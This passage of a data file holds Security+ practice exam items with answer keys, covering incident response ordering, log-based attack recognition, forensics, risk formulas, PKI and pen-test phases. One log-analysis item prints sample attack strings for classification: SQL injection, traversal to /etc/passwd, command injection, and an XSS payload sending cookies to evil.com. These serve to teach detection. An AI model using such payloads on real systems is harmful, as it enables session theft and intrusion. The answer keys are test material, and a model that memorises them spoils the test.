      { id: "s4", text: "Notify the CISO, legal counsel, and assess state/federal breach notification obligations" },
      { id: "s5", text: "Conduct lessons-learned meeting and update the IR playbook with new detection rules and prevention controls" },
      { id: "s6", text: "Reimage the server with clean OS, apply all patches, and redeploy with updated endpoint protection" },
      { id: "s7", text: "Scan the entire environment for lateral movement — confirm no other systems are compromised" },
    ],
    correctOrder: ["s1", "s3", "s7", "s4", "s2", "s6", "s5"],
    explanation: `CORRECT ORDER & NIST SP 800-61 PHASE:\n\n1. s1 — CONTAIN: Isolate immediately. Stop the bleeding. Every second of delay = more files encrypted.\n2. s3 — ERADICATE (part 1): Identify the threat before removing it. Know what you're dealing with.\n3. s7 — ERADICATE (part 2): Confirm scope — lateral movement means other systems may be infected.\n4. s4 — NOTIFY: Once scope is confirmed, legal/compliance obligations kick in.\n5. s2 — RECOVER: Restore from backup AFTER eradication is confirmed — not before.\n6. s6 — RECOVER (harden): Rebuild clean with updated defenses.\n7. s5 — POST-INCIDENT: Improve playbooks, share threat intel, update controls.\n\nCRITICAL RULES:\n• CONTAIN before ERADICATE: Stop the spread before removing root cause\n• DON'T necessarily shut down: Volatile memory may contain encryption keys or attacker artifacts\n• CHAIN OF CUSTODY: If legal action is possible, preserve evidence before making changes\n• DOCUMENT EVERYTHING: Timestamps on every action — required for legal proceedings\n\nBREACH NOTIFICATION TIMELINES:\n• HIPAA: 60 days from discovery of breach\n• GDPR: 72 hours to supervisory authority\n• PCI-DSS: Immediately notify card brands and acquiring bank\n• US State laws: Vary widely — many require 30-90 days notification to affected individuals`,
  },
  {
    id: 12, domain: "Domain 4", domainName: "Security Operations",
    title: "Log Analysis — Attack Pattern Recognition", type: "hotspot", difficulty: "Hard",
    examTip: "Log analysis PBQs require pattern recognition. Look for SQL keywords, path traversal sequences, and volume anomalies.",
    scenario: `A SOC analyst reviews the following web server log excerpts. For each excerpt, identify the most likely attack or event:`,
    hotspots: [
      { id: "h1", label: "GET /search.php?id=1' OR '1'='1'--  [200 OK]", options: ["SQL Injection", "XSS Attack", "Directory Traversal", "Normal Traffic"], correct: "SQL Injection", reason: "OR '1'='1' and -- (comment) are classic SQL injection payloads. This boolean injection always returns true. 200 response suggests it may have worked." },
      { id: "h2", label: "GET /../../../../etc/passwd HTTP/1.1 [200]\nGET /../../../../etc/shadow HTTP/1.1 [403]", options: ["SQL Injection", "XSS Attack", "Directory Traversal", "Brute Force"], correct: "Directory Traversal", reason: "../ sequences attempt to escape the web root to read system files. Got passwd (world-readable) but was blocked from shadow (root-only). Attacker is harvesting credentials." },
      { id: "h3", label: "10.0.0.20 — FAILED LOGIN admin [03:45:01]\n10.0.0.20 — FAILED LOGIN admin [03:45:02]\n... (849 failed attempts in 60 seconds) ...", options: ["Password Spraying", "Brute Force", "Credential Stuffing", "Normal Traffic"], correct: "Brute Force", reason: "Same username (admin), rapid failures, single IP = brute force. Password spraying = one password across many users. Credential stuffing = uses breached username/password pairs." },
      { id: "h4", label: "GET /page?q=<script>document.location='http://evil.com/?c='+document.cookie</script>  [200]", options: ["SQL Injection", "XSS Attack", "CSRF Attack", "Command Injection"], correct: "XSS Attack", reason: "The script tag with document.cookie is a cookie-stealing XSS payload. If reflected back to a victim, this exfiltrates their session cookie to the attacker's server." },
      { id: "h5", label: "GET /; cat /etc/passwd HTTP/1.1 [500]\nGET /; ls -la / HTTP/1.1 [500]\nGET /; id HTTP/1.1 [200]", options: ["SQL Injection", "XSS Attack", "Command Injection", "Directory Traversal"], correct: "Command Injection", reason: "Semicolons followed by OS commands (cat, ls, id) = OS command injection. Attacker is trying to inject shell commands into a web parameter. 200 on 'id' suggests success." },
    ],
    explanation: `LOG ANALYSIS ATTACK SIGNATURES:\n\nSQL INJECTION indicators:\n• SQL keywords: UNION, SELECT, INSERT, DROP, WHERE, FROM\n• Comment sequences: --, /*, #, ;--\n• Boolean: OR '1'='1', AND 1=1\n• Timing: SLEEP(5), WAITFOR DELAY\n\nDIRECTORY TRAVERSAL indicators:\n• ../ or ..\\ sequences\n• URL-encoded: %2e%2e%2f or %252e (double-encoded)\n• Linux targets: /etc/passwd, /etc/shadow, /proc/\n• Windows targets: \\windows\\system32\\, \\boot.ini\n\nXSS indicators:\n• <script>, </script> tags\n• Event handlers: onerror=, onload=, onclick=\n• JavaScript: alert(), document.cookie, eval()\n• Encoded: %3cscript%3e (URL), &#60;script&#62; (HTML)\n\nBRUTE FORCE vs SPRAY vs STUFFING:\n• Brute Force: Many passwords → 1 account, fast, one IP\n• Password Spray: 1 password → many accounts, slow (evade lockout)\n• Credential Stuffing: Known username/password pairs from previous breaches\n\nHTTP STATUS CODES:\n• 200 = Success (attack may have worked!)\n• 403 = Forbidden (blocked by ACL)\n• 404 = Not found (scanning)\n• 500 = Server error (possible injection side effect)\n• 302 = Redirect (watch for open redirects)`,
  },
  {
    id: 13, domain: "Domain 4", domainName: "Security Operations",
    title: "Security Tool Selection", type: "matching", difficulty: "Medium",
    examTip: "Confusing IDS vs IPS vs SIEM vs firewall is one of the most common exam mistakes. IDS detects, IPS blocks, SIEM correlates.",
    scenario: `A security team is building out SOC capabilities. Match each security NEED to the correct TOOL:`,
    pairs: [
      { id: "a", left: "Collect logs from 50 systems, correlate failed logins + successful logins, and alert on this pattern.", right: "SIEM (Security Information & Event Management)" },
      { id: "b", left: "Automatically block network traffic matching known attack signatures in real-time inline.", right: "IPS (Intrusion Prevention System)" },
      { id: "c", left: "Monitor network traffic for suspicious patterns and generate alerts — without blocking anything.", right: "IDS (Intrusion Detection System)" },
      { id: "d", left: "Run suspicious executable files in an isolated environment to observe their behavior safely.", right: "Sandbox / Malware Detonation" },
      { id: "e", left: "Prevent employees from emailing spreadsheets containing Social Security Numbers to personal accounts.", right: "DLP (Data Loss Prevention)" },
      { id: "f", left: "Automatically triage security alerts, enrich them with threat intel, and open tickets without human intervention.", right: "SOAR (Security Orchestration, Automation & Response)" },
    ],
    explanation: `SECURITY TOOL REFERENCE GUIDE:\n\nDETECTION TOOLS:\n• IDS: Intrusion DETECTION — passive, alerts only, out-of-band (mirror/SPAN port)\n  - Signature-based: matches known attack patterns\n  - Anomaly-based: detects deviations from baseline (catches zero-days)\n• SIEM: Log aggregation + correlation + alerting. Does NOT block traffic itself.\n  Examples: Splunk, IBM QRadar, Microsoft Sentinel, Elastic SIEM\n\nPREVENTION TOOLS:\n• IPS: Intrusion PREVENTION — active, inline, blocks matching traffic\n  Trade-off: false positives can cause outages\n• Firewall: Controls traffic based on rules (L3/L4). NGFW adds L7 app awareness.\n• WAF: Web Application Firewall — HTTP-specific, blocks SQLi/XSS/CSRF\n\nVISIBILITY/CONTROL:\n• Proxy/Content Filter: Intermediates web traffic, SSL inspection, blocks categories\n• DLP: Inspects content for sensitive data patterns (SSN, credit cards, IP)\n• CASB: Cloud Access Security Broker — visibility over SaaS application usage\n\nAUTOMATION:\n• SOAR: Automates repetitive SOC tasks — alert triage, indicator lookup, ticket creation\n• EDR: Endpoint Detection & Response — advanced endpoint telemetry + response\n• XDR: Extended Detection & Response — EDR + network + cloud in unified platform\n\nKEY DIFFERENCE: IDS/IPS vs Firewall:\n• Firewall: rule-based allow/block on IP/port/protocol\n• IDS/IPS: looks at content/behavior of traffic (payload analysis)`,
  },
  {
    id: 14, domain: "Domain 4", domainName: "Security Operations",
    title: "Change Management Process", type: "ordering", difficulty: "Medium",
    examTip: "Change management order is tested directly. Test BEFORE CAB approval. Rollback plan must exist BEFORE implementation.",
    scenario: `A sysadmin needs to apply a critical security patch to 200 production web servers over the weekend. Place the change management steps in the correct order:`,
    items: [
      { id: "c1", text: "Submit a formal Change Request documenting: what changes, why, rollback plan, and maintenance window" },
      { id: "c2", text: "Deploy the patch to all 200 production servers during the approved maintenance window" },
      { id: "c3", text: "Change Advisory Board (CAB) reviews documentation and formally approves the change" },
      { id: "c4", text: "Test the patch in a staging environment that mirrors production — verify no application breakage" },
      { id: "c5", text: "Conduct post-implementation review — document what worked, what didn't, and update runbooks" },
      { id: "c6", text: "Monitor systems after deployment — execute rollback immediately if critical issues arise" },
      { id: "c7", text: "Assess the risk and business impact of applying (and not applying) the patch" },
    ],
    correctOrder: ["c1", "c7", "c4", "c3", "c2", "c6", "c5"],
    explanation: `CHANGE MANAGEMENT CORRECT ORDER:\n\n1. SUBMIT Change Request — document scope, justification, risk, rollback plan\n2. ASSESS Risk & Impact — what breaks if it goes wrong? Who is affected? Is not patching riskier?\n3. TEST in staging — NEVER patch production without staging test first\n4. CAB APPROVAL — formal authorization from Change Advisory Board\n5. IMPLEMENT in maintenance window — execute exactly as documented\n6. MONITOR & Rollback — watch for issues; execute rollback if needed\n7. POST-IMPLEMENTATION REVIEW — document outcomes, update procedures\n\nKEY CONCEPTS:\n• CAB: Change Advisory Board — reviews and approves changes\n• Emergency Change: Expedited process for critical zero-day — fewer approvals but still documented\n• Change Freeze: Periods when no changes allowed (e.g., holiday season for retail)\n• Rollback Plan: MUST be defined before implementation — not after something breaks\n• Maintenance Window: Scheduled low-impact time for changes\n\nSECURITY CONNECTION:\n• Unauthorized changes = potential backdoor or persistence mechanism\n• Configuration drift: Systems diverge from secure baseline without change tracking\n• CMDB: Configuration Management Database — records all assets and their states\n\nBUSINESS IMPACT:\n• Applying patch risk: Application may break\n• NOT applying patch risk: Vulnerability exploitation\n• CAB weighs BOTH — sometimes risk of patching > risk of exploit (for critical systems)`,
  },
  {
    id: 15, domain: "Domain 4", domainName: "Security Operations",
    title: "Digital Forensics Evidence Collection", type: "ordering", difficulty: "Hard",
    examTip: "Order of volatility and chain of custody are direct exam questions. Volatile data FIRST. Never work on original evidence.",
    scenario: `A forensic investigator is called to examine an employee's workstation suspected in an insider threat case. The machine is still running. Place the forensic collection steps in the correct order:`,
    items: [
      { id: "f1", text: "Create a verified bit-for-bit forensic image of the hard drive using write-blocking hardware" },
      { id: "f2", text: "Hash the forensic image with SHA-256 and document the hash value for chain of custody" },
      { id: "f3", text: "Capture volatile data: running processes, active network connections, and RAM dump" },
      { id: "f4", text: "Photograph the workstation, screen, and surrounding environment before touching anything" },
      { id: "f5", text: "Analyze the forensic image copy for evidence — never work on the original media" },
      { id: "f6", text: "Place original hard drive in antistatic, tamper-evident evidence bag and secure in evidence locker" },
      { id: "f7", text: "Document findings, methodology, and complete chain of custody in forensic report" },
    ],
    correctOrder: ["f4", "f3", "f1", "f2", "f6", "f5", "f7"],
    explanation: `FORENSIC COLLECTION ORDER:\n\n1. DOCUMENT SCENE (f4): Photograph everything before touching. Preserve state. Notes on who was present.\n2. VOLATILE DATA (f3): RAM, network connections, running processes, clipboard. These DISAPPEAR on shutdown.\n3. IMAGE the drive (f1): Bit-for-bit copy with hardware write blocker. Never write to original.\n4. HASH the image (f2): SHA-256 proves image = original. Required for admissibility in court.\n5. SECURE originals (f6): Evidence bag + tamper-evident seal + secure storage. Log every access.\n6. ANALYZE image (f5): Work ONLY on forensic copies. Original stays pristine.\n7. REPORT (f7): Document methodology, timeline, findings, chain of custody.\n\nORDER OF VOLATILITY (most to least volatile):\n1. CPU registers and cache\n2. RAM (system memory)\n3. Network connections and ARP cache\n4. Running processes\n5. Files on disk (hard drive) ← LEAST volatile\n6. Remote logging / cloud logs\n7. Physical backups and optical media\n\nHARDWARE WRITE BLOCKER: Device inserted between drive and forensic system that prevents ANY writes to evidence drive during imaging.\n\nCHAIN OF CUSTODY REQUIREMENTS:\n• Who collected it? When? Where?\n• Who has had access since collection?\n• How was it stored and transported?\n• Any break in custody = evidence may be inadmissible in court\n\nHASHING FOR INTEGRITY:\n• Hash drive before and after — if hashes match, evidence is unaltered\n• MD5 still commonly used in forensics despite crypto weakness (fast, widely supported)\n• SHA-256 preferred for legal proceedings`,
  },
  {
    id: 16, domain: "Domain 5", domainName: "Security Program Management & Oversight",
    title: "Quantitative Risk Calculation", type: "calculation", difficulty: "Medium",
    examTip: "SLE=AV×EF and ALE=SLE×ARO appear on nearly every exam. Convert percentages to decimals first.",
    scenario: `Your organization is assessing risk to its primary e-commerce database. Use the following data:\n\n• Asset Value (AV): $2,000,000\n• Exposure Factor (EF): 25% (portion of asset lost per incident)\n• Annual Rate of Occurrence (ARO): 3 incidents expected per year\n• Proposed control cost: $100,000/year (reduces ARO from 3 to 0.5)`,
    questions: [
      { id: "q1", question: "What is the Single Loss Expectancy (SLE)?", formula: "SLE = AV × EF", options: ["$250,000", "$500,000", "$750,000", "$2,000,000"], correct: "$500,000", work: "$2,000,000 × 0.25 = $500,000" },
      { id: "q2", question: "What is the Annual Loss Expectancy (ALE) without controls?", formula: "ALE = SLE × ARO", options: ["$500,000", "$1,000,000", "$1,500,000", "$6,000,000"], correct: "$1,500,000", work: "$500,000 × 3 = $1,500,000" },
      { id: "q3", question: "What is the ALE after implementing the control (ARO drops to 0.5)?", formula: "New ALE = SLE × New ARO", options: ["$100,000", "$250,000", "$500,000", "$750,000"], correct: "$250,000", work: "$500,000 × 0.5 = $250,000" },
      { id: "q4", question: "What is the Return on Security Investment (ROSI)?", formula: "ROSI = (Old ALE − New ALE) − Annual Control Cost", options: ["$1,150,000", "$1,250,000", "$1,400,000", "$150,000"], correct: "$1,150,000", work: "($1,500,000 − $250,000) − $100,000 = $1,150,000" },
    ],
    explanation: `COMPLETE RISK FORMULAS:\n\n  SLE = AV × EF\n  (Single Loss Expectancy — cost of ONE incident)\n\n  ALE = SLE × ARO\n  (Annual Loss Expectancy — expected annual cost without controls)\n\n  ROSI = (ALE_before − ALE_after) − Annual_Control_Cost\n  (Return on Security Investment — is the control worth its cost?)\n\nWORKED SOLUTION:\n  SLE = $2,000,000 × 0.25 = $500,000\n  ALE before = $500,000 × 3 = $1,500,000\n  ALE after = $500,000 × 0.5 = $250,000\n  ROSI = ($1,500,000 − $250,000) − $100,000 = $1,150,000\n  The control saves $1.15M annually — clearly justified.\n\nOTHER KEY RISK TERMS:\n• RTO (Recovery Time Objective): Max time system can be down before unacceptable business impact\n• RPO (Recovery Point Objective): Max acceptable data loss, expressed in time ("can lose up to 4 hours")\n• MTD (Maximum Tolerable Downtime): Absolute limit — if exceeded, business may not recover\n• MTTR (Mean Time To Repair): Average time to restore after failure\n• MTBF (Mean Time Between Failures): Average time between incidents\n\nQUALITATIVE vs QUANTITATIVE RISK:\n• Quantitative: Dollar values (this scenario) — precise but data-intensive\n• Qualitative: High/Medium/Low ratings — faster but less precise\n• Semi-quantitative: Combines both approaches`,
  },
  {
    id: 17, domain: "Domain 5", domainName: "Security Program Management & Oversight",
    title: "Data Classification and Compliance", type: "matching", difficulty: "Easy",
    examTip: "Know which regulation covers which data type. HIPAA=health, PCI-DSS=payment cards, GDPR=EU personal data.",
    scenario: `A compliance officer is mapping data types to regulations and classifications. Match each data type to its correct regulation or classification:`,
    pairs: [
      { id: "a", left: "Patient medical records, diagnosis history, and prescription information.", right: "PHI — Protected by HIPAA" },
      { id: "b", left: "Customer credit card numbers, CVV, and expiration dates in an e-commerce database.", right: "Cardholder Data — Protected by PCI-DSS" },
      { id: "c", left: "Names, email addresses, and location data of EU citizens stored on US company servers.", right: "Personal Data — Protected by GDPR" },
      { id: "d", left: "Company's proprietary source code and unreleased product roadmap — not regulated but business-critical.", right: "Confidential / Trade Secret — Internal classification" },
      { id: "e", left: "Marketing brochures and press releases — explicitly approved for public distribution.", right: "Public / Unclassified" },
      { id: "f", left: "Student academic records at a US university — grades, transcripts, disciplinary records.", right: "Education Records — Protected by FERPA" },
    ],
    explanation: `DATA CLASSIFICATION FRAMEWORKS:\n\nGOVERNMENT LEVELS: Top Secret → Secret → Confidential → Unclassified\nCORPORATE LEVELS: Restricted/Confidential → Internal/Private → Public\n(Labels vary by organization)\n\nKEY REGULATIONS TO KNOW FOR SECURITY+:\n\n• HIPAA (Health Insurance Portability and Accountability Act):\n  - US healthcare data. PHI = any info that identifies a patient AND relates to health.\n  - Breach notification: 60 days to affected individuals, HHS, and media if >500 in state.\n  - Penalties: $100 to $50,000+ per violation\n\n• PCI-DSS (Payment Card Industry Data Security Standard):\n  - Applies to any org that stores, processes, or transmits cardholder data.\n  - 12 requirements — network security, access control, monitoring, etc.\n  - Not a law — contractual requirement from card brands.\n\n• GDPR (General Data Protection Regulation):\n  - EU regulation. Applies to ANY organization handling EU citizen data, regardless of where HQ is.\n  - 72-hour breach notification to supervisory authority.\n  - Right to erasure ("right to be forgotten"), data portability, consent requirements.\n  - Fines: up to 4% of global annual revenue or €20M, whichever is higher.\n\n• FERPA: Student education records at US institutions.\n• GLBA: Financial institutions — personal financial data.\n• SOX: Public companies — financial reporting integrity.\n• CCPA: California residents — similar to GDPR.\n\nDATA STATES:\n• At rest: Stored (disk, DB) — encrypt with AES-256\n• In transit: Moving over network — encrypt with TLS 1.2+\n• In use: Being processed — hardest to protect`,
  },
  {
    id: 18, domain: "Domain 5", domainName: "Security Program Management & Oversight",
    title: "Security Control Type Classification", type: "matching", difficulty: "Medium",
    examTip: "Controls have both a TYPE (what it does) and a CATEGORY (how it's implemented). A camera can be both PHYSICAL and DETECTIVE.",
    scenario: `A security assessor is categorizing existing controls. Match each control to its PRIMARY TYPE:`,
    pairs: [
      { id: "a", left: "A firewall blocking all traffic from known malicious IP addresses.", right: "Preventive (Technical)" },
      { id: "b", left: "CCTV cameras recording all activity in the data center 24/7.", right: "Detective (Physical)" },
      { id: "c", left: "Automated system that quarantines and removes malware when detected on an endpoint.", right: "Corrective (Technical)" },
      { id: "d", left: "'Authorized Personnel Only — 24/7 Video Surveillance' sign at the data center entrance.", right: "Deterrent (Physical)" },
      { id: "e", left: "A mandatory annual security awareness training policy for all employees.", right: "Directive (Administrative)" },
      { id: "f", left: "Monthly manual access reviews required because automated provisioning isn't yet deployed.", right: "Compensating (Administrative)" },
    ],
    explanation: `SECURITY CONTROL CLASSIFICATION:\n\nCONTROL TYPES (what the control DOES):\n• PREVENTIVE: Stops incidents before they happen\n  Examples: firewalls, MFA, encryption, door locks, patches\n• DETECTIVE: Identifies incidents that occurred\n  Examples: IDS, SIEM, audit logs, cameras, security reviews\n• CORRECTIVE: Repairs damage after an incident\n  Examples: backups, patch deployment, quarantine, system restore\n• DETERRENT: Discourages attacks through perceived consequences\n  Examples: warning signs, prosecution notices, visible cameras, login banners\n• COMPENSATING: Alternative when primary control isn't feasible\n  Examples: manual review instead of automated control\n• DIRECTIVE: Documents required behavior\n  Examples: policies, procedures, standards, training requirements\n• RECOVERY: Restores systems/operations (sometimes separate from Corrective)\n  Examples: DR site, backup restoration, BCP activation\n\nCONTROL CATEGORIES (WHERE/HOW implemented):\n• PHYSICAL: Real-world, tangible (locks, guards, fences, mantraps, cameras)\n• TECHNICAL/LOGICAL: Technology-based (firewalls, encryption, IDS, MFA)\n• ADMINISTRATIVE/MANAGERIAL: People and process (policies, training, background checks, procedures)\n\nOVERLAPS (know these):\n• Visible camera = PHYSICAL DETERRENT or PHYSICAL DETECTIVE\n• Login warning banner = TECHNICAL DETERRENT\n• MFA requirement policy = ADMINISTRATIVE DIRECTIVE or PREVENTIVE\n• Account lockout = TECHNICAL PREVENTIVE\n• Antivirus = TECHNICAL DETECTIVE + CORRECTIVE (detects and removes)`,
  },
  {
    id: 19, domain: "Domain 5", domainName: "Security Program Management & Oversight",
    title: "Business Continuity Planning Sequence", type: "ordering", difficulty: "Hard",
    examTip: "BIA is PLANNING (pre-event). RTO/RPO come from BIA. Hot site = minutes. Warm = hours. Cold = days.",
    scenario: `A hurricane has flooded the primary data center. The company has a BCP/DR plan. Place the response actions in the correct order:`,
    items: [
      { id: "b1", text: "Formally declare a disaster and activate the DR plan per documented BCP procedures" },
      { id: "b2", text: "Begin restoring critical systems at the warm DR site using replicated backup data" },
      { id: "b3", text: "The BIA (Business Impact Analysis) was previously conducted to identify critical systems and their RTOs/RPOs" },
      { id: "b4", text: "Test all restored systems and confirm business applications are functioning correctly" },
      { id: "b5", text: "Resume normal operations from primary data center once repairs are complete" },
      { id: "b6", text: "Assess damage to the primary data center and determine recovery timeline" },
      { id: "b7", text: "Conduct post-incident review and update the BCP with lessons learned from the disaster response" },
    ],
    correctOrder: ["b3", "b6", "b1", "b2", "b4", "b5", "b7"],
    explanation: `CORRECT ORDER WITH EXPLANATION:\n\n1. b3 — BIA (pre-event planning): The BIA was done BEFORE the disaster. It defined RTO/RPO and identified critical systems. This is your foundation.\n2. b6 — ASSESS DAMAGE: Understand the scope before activating DR. Can the primary site recover quickly?\n3. b1 — DECLARE DISASTER & ACTIVATE DR PLAN: Formal declaration triggers vendor SLAs, notifies stakeholders.\n4. b2 — RESTORE AT DR SITE: Bring up systems in priority order from BIA.\n5. b4 — TEST RESTORED SYSTEMS: Verify before announcing recovery — don't tell users it's ready until confirmed.\n6. b5 — RESUME NORMAL OPS: Return to primary site when repaired and tested.\n7. b7 — LESSONS LEARNED: Update the plan. What worked? What failed?\n\nBCP/DR TERMINOLOGY:\n• BIA (Business Impact Analysis): Identifies critical functions, quantifies impact, establishes RTO/RPO. Done BEFORE any disaster.\n• RTO (Recovery Time Objective): Max downtime before unacceptable business impact. Sets how fast you must recover.\n• RPO (Recovery Point Objective): Max data loss tolerable. Sets backup frequency requirements.\n• MTD (Maximum Tolerable Downtime): Absolute limit — business fails if exceeded.\n\nDR SITE TYPES:\n• HOT SITE: Fully operational duplicate. Failover in minutes. Most expensive.\n• WARM SITE: Partially configured hardware/software. Failover in hours-days. Mid-cost.\n• COLD SITE: Empty facility with power/network. Failover in days-weeks. Cheapest.\n• CLOUD DR: On-demand DR resources. Pay per use. Increasingly common.\n\nBACKUP TYPES:\n• Full backup: Copy everything. Slow to create, fast to restore.\n• Incremental: Only changes since last backup (any type). Fast to create, slow to restore.\n• Differential: Changes since last FULL backup. Middle ground.`,
  },
  {
    id: 20, domain: "Domain 2", domainName: "Threats, Vulnerabilities & Mitigations",
    title: "Penetration Testing Phases", type: "ordering", difficulty: "Hard",
    examTip: "Pen test phases follow PTES. Reconnaissance comes first. Report and cleanup always last.",
    scenario: `A pen tester has a signed Statement of Work and Rules of Engagement for an external assessment. Place the testing activities in the correct phase order:`,
    items: [
      { id: "p1", text: "Use Metasploit to exploit CVE-2021-41773 on the confirmed vulnerable Apache server" },
      { id: "p2", text: "Run Nmap against the target IP range to discover open ports and running services" },
      { id: "p3", text: "Create a persistent backdoor and hidden admin account on the compromised web server" },
      { id: "p4", text: "Use OSINT tools (Shodan, theHarvester, LinkedIn, WHOIS) to gather info about the org and employees" },
      { id: "p5", text: "Run Nessus vulnerability scanner against all discovered services to identify exploitable weaknesses" },
      { id: "p6", text: "Remove all tools, backdoors, and test accounts; deliver final findings report to client" },
      { id: "p7", text: "Move laterally from the compromised web server toward the internal database servers" },
    ],
    correctOrder: ["p4", "p2", "p5", "p1", "p3", "p7", "p6"],
    explanation: `PENETRATION TESTING PHASES (PTES Standard):\n\n1. PASSIVE RECONNAISSANCE (p4): OSINT — gather info without touching target systems\n   Tools: Shodan, theHarvester, Maltego, LinkedIn, WHOIS, Google dorking\n\n2. ACTIVE SCANNING (p2): Direct probing of target systems\n   Tools: Nmap (port scan), Nessus (vuln scan), nikto (web scan)\n\n3. VULNERABILITY ANALYSIS (p5): Identify specific exploitable weaknesses from scan results\n   Tools: Nessus, OpenVAS, Burp Suite (web)\n\n4. EXPLOITATION (p1): Actually exploit vulnerabilities\n   Tools: Metasploit, custom exploits, sqlmap, Burp Suite\n\n5. POST-EXPLOITATION/PERSISTENCE (p3): Establish foothold, escalate privileges, maintain access\n   Techniques: backdoors, scheduled tasks, new accounts, rootkits\n\n6. LATERAL MOVEMENT (p7): Pivot from initial foothold to high-value targets\n   Techniques: pass-the-hash, Kerberoasting, credential harvesting\n\n7. REPORTING + CLEANUP (p6): Remove all artifacts, document everything\n   Deliverable: Executive summary + technical findings + remediation recommendations\n\nPEN TEST TYPES:\n• Black Box: Zero knowledge — simulates external attacker\n• Gray Box: Some knowledge (network diagram, credentials) — most common\n• White Box: Full knowledge (source code, all creds) — most comprehensive\n\nCRITICAL LEGAL REQUIREMENT:\n• Statement of Work (SOW) + Rules of Engagement (ROE) MUST be signed BEFORE testing\n• Defines: scope, timing, out-of-scope systems, escalation contacts, notification procedures`,
  },
  {
    id: 21, domain: "Domain 1", domainName: "General Security Concepts",
    title: "PKI Certificate Management", type: "matching", difficulty: "Hard",
    examTip: "PKI chain of trust and revocation methods (CRL vs OCSP) are high-frequency exam topics in Domain 1.",
    scenario: `A PKI administrator is managing certificate infrastructure. Match each scenario to the correct PKI concept or action:`,
    pairs: [
      { id: "a", left: "A private key is exposed in a breach. The certificate must be invalidated immediately — it still has 2 years left.", right: "Certificate Revocation — CRL / OCSP" },
      { id: "b", left: "Employees' browsers show a certificate error for the intranet site because the CA isn't in their browser's trust store.", right: "Untrusted / Internal CA — install root cert or use public CA" },
      { id: "c", left: "A single certificate covers login.company.com, api.company.com, and app.company.com.", right: "SAN (Subject Alternative Name) Certificate" },
      { id: "d", left: "The root CA signs only intermediate CA certs and is kept in an offline hardware vault, never connected to a network.", right: "Offline Root CA (best practice)" },
      { id: "e", left: "Server includes a pre-fetched OCSP response in the TLS handshake, eliminating client need to query the OCSP server.", right: "OCSP Stapling" },
    ],
    explanation: `PKI (Public Key Infrastructure) COMPLETE REFERENCE:\n\nTRUST HIERARCHY:\n  Root CA → Intermediate CA → End-Entity Certificate\n  • Root CA is the trust anchor — browsers ship with ~150 trusted Root CAs\n  • Offline Root CA = best practice — if root is online and compromised, entire PKI is compromised\n  • Intermediate CAs handle day-to-day certificate issuance\n\nCERTIFICATE TYPES:\n  • DV (Domain Validated): Verifies domain control only. Fast, cheap. No org verification.\n  • OV (Organization Validated): Verifies org identity. More trust.\n  • EV (Extended Validation): Highest verification. Green address bar.\n  • Wildcard (*.domain.com): Covers all subdomains at one level.\n  • SAN (Subject Alternative Name): One cert for multiple distinct domains.\n\nREVOCATION METHODS:\n  • CRL (Certificate Revocation List): Downloadable list of revoked serial numbers.\n    - Problem: Can be stale between updates (published every 24h-7 days)\n  • OCSP (Online Certificate Status Protocol): Real-time single certificate check.\n    - Problem: Privacy concern (CA knows which certs you're checking)\n  • OCSP Stapling: Server gets its own OCSP response and includes in TLS handshake.\n    - Solves: Both performance and privacy issues\n  • Certificate Pinning: Client hardcodes expected cert/key — prevents MITM even with valid cert.\n\nCOMMON CERTIFICATE ERRORS:\n  • Expired: Past NotAfter date\n  • Hostname mismatch: Cert issued for different domain\n  • Untrusted CA: Root not in browser trust store\n  • Self-signed: No CA in chain (fine for internal dev, not production)`,
  },
  {
    id: 22, domain: "Domain 3", domainName: "Security Architecture",
    title: "IAM Attack Response — Choose All Controls", type: "multiselect", difficulty: "Medium",
    examTip: "For multi-select, evaluate each option independently. Multiple valid controls can apply to the same attack scenario.",
    scenario: `An account takeover attack occurred — stolen credentials were used to access the HR system for 3 weeks before detection. The attacker accessed payroll data from unusual times and geolocations.\n\nSelect ALL controls that would have PREVENTED or DETECTED this attack:`,
    items: [
      { id: "m1", text: "Implement MFA for all VPN and cloud application logins", correct: true, reason: "MFA directly prevents credential-only attacks. Stolen password alone isn't enough if MFA is enforced." },
      { id: "m2", text: "Upgrade office WiFi from WPA2 to WPA3", correct: false, reason: "WiFi protocol is irrelevant here — the attacker used stolen credentials over VPN, not local WiFi." },
      { id: "m3", text: "Configure SIEM alerts for logins outside business hours and from unusual geolocations", correct: true, reason: "Detective control — this would have detected the anomalous access pattern within days instead of weeks." },
      { id: "m4", text: "Implement Privileged Access Management (PAM) with session recording for HR systems", correct: true, reason: "PAM would log all sessions and alert on unusual access, enabling detection and forensic review." },
      { id: "m5", text: "Reduce minimum password length from 12 to 6 characters for ease of use", correct: false, reason: "Shorter passwords are weaker — this makes future credential compromise MORE likely, not less." },
      { id: "m6", text: "Deploy UEBA (User and Entity Behavior Analytics) to detect deviations from normal user patterns", correct: true, reason: "UEBA is specifically designed for this scenario — learns baseline behavior and flags anomalies like off-hours access." },
      { id: "m7", text: "Enforce least privilege — HR analysts only access records within their department scope", correct: true, reason: "Least privilege limits blast radius. Even with valid creds, attacker access would be limited to what that user needs." },
      { id: "m8", text: "Implement just-in-time (JIT) privileged access — access expires automatically after a defined period", correct: true, reason: "JIT access would have automatically revoked the attacker's access, limiting the 3-week window dramatically." },
    ],
    explanation: `ACCOUNT TAKEOVER DEFENSE LAYERS:\n\nPREVENTIVE CONTROLS:\n• MFA: Most impactful single control against credential theft\n• Least Privilege / RBAC: Limit what attacker can access with valid creds\n• JIT Access: Time-limited privileged access\n• Password managers + long passphrases: Harder credentials to steal\n• Conditional Access: Block logins from unusual locations/devices\n\nDETECTIVE CONTROLS:\n• SIEM behavioral alerts: Off-hours, geolocation, impossible travel\n• UEBA: Machine learning baseline of normal activity\n• PAM session recording: Full audit trail of privileged access\n• Regular access reviews: Catch accumulated permissions\n\nZERO TRUST PRINCIPLES APPLIED:\n• Verify every access attempt — don't trust based on network location alone\n• Use all available context: time, location, device, user history\n• Assume breach — design detection as if attacker already has credentials\n\nMULTISELECT STRATEGY:\n1. Read what the ACTUAL attack was (credential theft + long-undetected access)\n2. For each option: "Would this have prevented or detected THAT specific attack?"\n3. Ignore options addressing unrelated attack vectors (WPA3 = wireless, not relevant here)\n4. Controls can be partially correct — but ask if they directly address the attack\n\nWHAT FAILED HERE:\n• No MFA (allowed credential-only access)\n• No behavioral monitoring (3 weeks undetected)\n• No access time/location restrictions`,
  },
  {
    id: 23, domain: "Domain 1", domainName: "General Security Concepts",
    title: "Identity Federation and SSO Protocols", type: "matching", difficulty: "Hard",
    examTip: "Federation protocols are tested in SY0-701. Know SAML vs OAuth 2.0 vs OpenID Connect and their use cases.",
    scenario: `An identity architect is designing an SSO solution. Match each requirement to the correct protocol or technology:`,
    pairs: [
